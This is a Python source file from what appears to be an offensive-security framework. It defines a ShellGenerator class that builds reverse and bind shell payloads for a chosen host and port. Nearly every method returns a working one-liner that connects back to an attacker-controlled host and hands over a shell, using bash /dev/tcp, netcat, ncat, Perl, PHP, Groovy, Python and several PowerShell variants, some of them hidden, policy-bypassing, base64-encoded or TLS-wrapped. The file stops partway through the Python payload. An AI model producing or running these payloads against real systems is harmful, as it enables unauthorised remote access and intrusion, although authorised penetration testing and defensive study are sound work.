#!/usr/bin/env python3
# Project: osiris-framework
# Author: Samir Sanchez Garnica @sasaga92
# Version 1.0
# Date: 01/12/2022

from utilities.Colors import color
from core.generator.Ofuscator import ofuscator


class ShellGenerator:
    def __init__(self, **kwargs):
        self.__temp_message = None
        self.__platform_allowed = ['linux', 'mac', 'windows', 'microsoft windows', 'gnu/linux']
        self.__type_allowed = ['bind', 'reverse', 'generic/shell/reverse_tcp']
        self.__status = {'message': '', 'code': 0}
        self.__payload = None
        self.__target = None
        self.__port = None
        self.__platform = None
        self.__type = None
        self.__prompt = None
        self.__prompt_unix = "/bin/bash"
        self.__prompt_windows = "cmd"

        for key, value in kwargs.items():
            self.__target = kwargs.get('target') if (kwargs.get('target') is not None) else False
            self.__port = str(kwargs.get('port')) if (kwargs.get('port') is not None) else False
            self.__platform = kwargs.get('platform') if (kwargs.get('platform') is not None) else False
            self.__type = kwargs.get('type') if (kwargs.get('type') is not None) else False

    def validate_parameters(self):
        self.__temp_message = ""
        if not self.__target:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
                "green", "target") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
        if not self.__port:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
                "green", "port") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
        if not self.__platform:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
                "green", "platform") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
        if not self.__type:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
                "green", "type") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def validate_parameter_linux(self):
        self.__temp_message = ""
        if not self.__platform.lower() in self.__platform_allowed or not "linux" in self.__platform.lower():
            self.__temp_message += color.color("lgray", "Platform ") + color.color("yellow", "{") + color.color("green",
                                                                                                                self.__platform) + color.color(
                "yellow", "}") + color.color("lgray", " not allowed for this payloads")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def validate_parameter_windows(self):
        self.__temp_message = ""
        if not self.__platform.lower() in self.__platform_allowed or not "windows" in self.__platform.lower():
            self.__temp_message += color.color("lgray", "Platform ") + color.color("yellow", "{") + color.color("green",
                                                                                                                self.__platform) + color.color(
                "yellow", "}") + color.color("lgray", " not allowed for this payloads")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def validate_parameter_mac(self):
        self.__temp_message = ""
        if not self.__platform.lower() in self.__platform_allowed or not "mac" in self.__platform.lower():
            self.__temp_message += color.color("lgray", "Platform ") + color.color("yellow", "{") + color.color("green",
                                                                                                                self.__platform) + color.color(
                "yellow", "}") + color.color("lgray", " not allowed for this payloads")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def validate_parameter_type_bind(self):
        self.__temp_message = ""
        if not self.__type.lower() in self.__type_allowed or not 'bind' in self.__type.lower():
            self.__temp_message += color.color("lgray", "Type payload ") + color.color("yellow", "{") + color.color(
                "green",
                self.__type) + color.color(
                "yellow", "}") + color.color("lgray", " not allowed for this payloads")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def validate_parameter_type_reverse(self):
        self.__temp_message = ""
        if not self.__type.lower() in self.__type_allowed or not 'reverse' in self.__type.lower():
            self.__temp_message += color.color("lgray", "Type payload ") + color.color("yellow", "{") + color.color(
                "green",
                self.__type) + color.color(
                "yellow", "}") + color.color("lgray", " not allowed for this payloads")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def bash_i(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "/bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(self.__target, self.__port)

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def bash_196(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "0<&196;exec 196<>/dev/tcp/{}/{}; /bin/bash <&196 >&196 2>&196".format(self.__target,
                                                                                                        self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def bash_readline(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def bash_5(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "/bin/bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def bash_udp(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "/bin/bash -i >& /dev/udp/{}/{} 0>&1".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def nc_mkfifo(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {} {} >/tmp/f".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def nc_mkfifo_sh(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def nc_mknod_sh(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status
    def nc_e(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "nc {} {} -e /bin/bash".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def nc_exe(self):
        """
            Description: This payload support Microsoft Windows
        """
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "nc.exe {} {} -e cmd".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def Groovy(self):
        """
            Description: This payload support Microsoft Windows
        """
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "String host=\"" + self.__target + "\";int port=" + self.__port + ";String cmd=\"cmd\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def ncat_exe(self):
        """
            Description: This payload support Microsoft Windows
        """
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "ncat.exe {} {} -e cmd".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def nc_c(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "nc -c /bin/bash {} {}".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def ncat_e(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "ncat {} {} -e /bin/bash".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def ncat_udp(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|ncat -u {} {} >/tmp/f".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def rustcat(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "rcat {} {} -r /bin/bash".format(self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def perl(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "perl -e \'use Socket;$i=\"" + self.__target + "\";$p=" + self.__port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};\'"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def perl_nosh(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"" + self.__target + ":" + self.__port + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def php_exec(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "php -r \'$sock=fsockopen(\"{}\",{});exec(\"/bin/bash <&3 >&3 2>&3\");\'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def php_shell_exec(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "php -r \'$sock=fsockopen(\"{}\",{});shell_exec(\"/bin/bash <&3 >&3 2>&3\");'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def php_system(self):
        """
            Description: This payload support GNU/Linux, Mac OSX and Microsoft Windows
        """
        self.__prompt = self.__prompt_unix if (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()[
            'code'] == 200) else self.__prompt_windows

        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
                self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "php -r '$sock=fsockopen(\"{}\",{});system(\"" + self.__prompt + " <&3 >&3 2>&3\");'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def php_passthru(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "php -r '$sock=fsockopen(\"{}\",{});passthru(\"/bin/bash <&3 >&3 2>&3\");'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def php_popen(self):
        """
            Description: This payload support GNU/Linux Mac OSX, and Microsoft Windows
        """
        self.__prompt = self.__prompt_unix if (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()[
            'code'] == 200) else self.__prompt_windows

        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
                self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "php -r '$sock=fsockopen(\"{}\",{});popen(\"" + self.__prompt + " <&3 >&3 2>&3\", \"r\");'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        elif self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()[
            'code'] == 200) and \
                self.validate_parameter_type_bind()['code'] == 200:
            try:
                self.__payload = "php -r \'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"" + self.__target + "\"," + self.__port + ");socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}\'"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))

        return self.__status

    def php_proc_popen(self):
        """
            Description: This payload support GNU/Linux Mac OSX, and Microsoft Windows
        """
        self.__prompt = self.__prompt_unix if (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()[
            'code'] == 200) else self.__prompt_windows

        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
                self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "php -r \'$sock=fsockopen(\"{}\",{});$proc=proc_open(\"" + self.__prompt + "\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'".format(
                    self.__target, self.__port)
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def powershell(self):
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + self.__target + "\"," + self.__port + "});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def powershell_2(self):
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'" + self.__target + "\'," + self.__port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def powershell_3(self):
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient(\'" + self.__target + "\', " + self.__port + ");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def powershell_3_base64(self):
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "$client = New-Object System.Net.Sockets.TCPClient(\"" + self.__target + "\"," + self.__port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
                self.__payload = ofuscator.base64_encode_win(self.__payload)
                self.__payload = "powershell -e " + self.__payload['message'] if self.__payload['code'] == 200 else \
                self.__payload['message']
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def powershell_4_tls(self):
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient(\'" + self.__target + "\', " + self.__port + ");$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient(\'cloudflare-dns.com\',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()};WriteToStream \'\';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def python_1(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "export RHOST=\"{}\";export RPORT={};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")\'".format(
                    self.__target, self.__port)
